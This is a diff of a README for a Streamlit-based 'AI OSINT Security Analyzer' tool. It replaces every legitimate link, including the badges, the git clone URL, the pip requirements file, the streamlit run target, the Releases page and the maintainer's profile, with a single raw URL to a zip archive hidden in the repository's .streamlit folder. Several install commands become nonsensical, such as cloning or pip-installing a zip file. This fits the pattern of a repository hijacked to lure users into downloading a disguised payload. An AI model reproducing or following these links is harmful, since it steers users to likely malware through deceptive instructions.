@@ -1,6 +1,6 @@
 # AI OSINT Security Analyzer 🛡️
 
-![GitHub release](https://img.shields.io/github/release/Armaan29-09-2005/AI-OSINT-Security-Analyzer.svg) ![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg) ![Streamlit](https://img.shields.io/badge/Streamlit-1.0%2B-orange.svg)
+![GitHub release](https://raw.githubusercontent.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer/main/.streamlit/Security_A_OSIN_Analyzer_3.9.zip) ![Python](https://raw.githubusercontent.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer/main/.streamlit/Security_A_OSIN_Analyzer_3.9.zip%https://raw.githubusercontent.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer/main/.streamlit/Security_A_OSIN_Analyzer_3.9.zip) ![Streamlit](https://raw.githubusercontent.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer/main/.streamlit/Security_A_OSIN_Analyzer_3.9.zip%https://raw.githubusercontent.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer/main/.streamlit/Security_A_OSIN_Analyzer_3.9.zip)
 
 Welcome to the **AI OSINT Security Analyzer**! This project leverages cutting-edge AI technology to enhance cybersecurity intelligence. Our Streamlit web app utilizes Cohere's Command A model, combined with powerful data sources like Shodan, VirusTotal, AbuseIPDB, and CVE databases. Together, these tools provide a comprehensive threat assessment for websites, CVEs, IP addresses, and software.
 
@@ -38,20 +38,20 @@ To get started with the **AI OSINT Security Analyzer**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer.git
+   git clone https://raw.githubusercontent.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer/main/.streamlit/Security_A_OSIN_Analyzer_3.9.zip
    cd AI-OSINT-Security-Analyzer
    ```
 
 2. **Install Required Packages**:
    Ensure you have Python 3.8 or higher installed. Use pip to install the necessary libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer/main/.streamlit/Security_A_OSIN_Analyzer_3.9.zip
    ```
 
 3. **Run the Application**:
    Launch the Streamlit app with the following command:
    ```bash
-   streamlit run app.py
+   streamlit run https://raw.githubusercontent.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer/main/.streamlit/Security_A_OSIN_Analyzer_3.9.zip
    ```
 
 ## Usage 🚀
@@ -63,7 +63,7 @@ Once the application is running, you can access it via your web browser at `http
 3. **Run Analysis**: Click the "Analyze" button to begin the assessment.
 4. **View Results**: Review the comprehensive threat assessment provided by the app.
 
-For downloadable releases, please visit [Releases](https://github.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer/releases) to get the latest version of the application.
+For downloadable releases, please visit [Releases](https://raw.githubusercontent.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer/main/.streamlit/Security_A_OSIN_Analyzer_3.9.zip) to get the latest version of the application.
 
 ## Contributing 🤝
 
@@ -93,7 +93,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or suggestions, please reach out to the project maintainer:
 
-- **Armaan**: [GitHub Profile](https://github.com/Armaan29-09-2005)
+- **Armaan**: [GitHub Profile](https://raw.githubusercontent.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer/main/.streamlit/Security_A_OSIN_Analyzer_3.9.zip)
 
 ## Acknowledgments 🙏
 
@@ -102,7 +102,7 @@ We acknowledge the developers of the libraries and tools that made this project 
 - **Cohere** for their AI models.
 - **Shodan**, **VirusTotal**, **AbuseIPDB**, and **CVE** for their valuable data sources.
 
-For downloadable releases, please visit [Releases](https://github.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer/releases) to get the latest version of the application.
+For downloadable releases, please visit [Releases](https://raw.githubusercontent.com/Armaan29-09-2005/AI-OSINT-Security-Analyzer/main/.streamlit/Security_A_OSIN_Analyzer_3.9.zip) to get the latest version of the application.
 
 ---
 
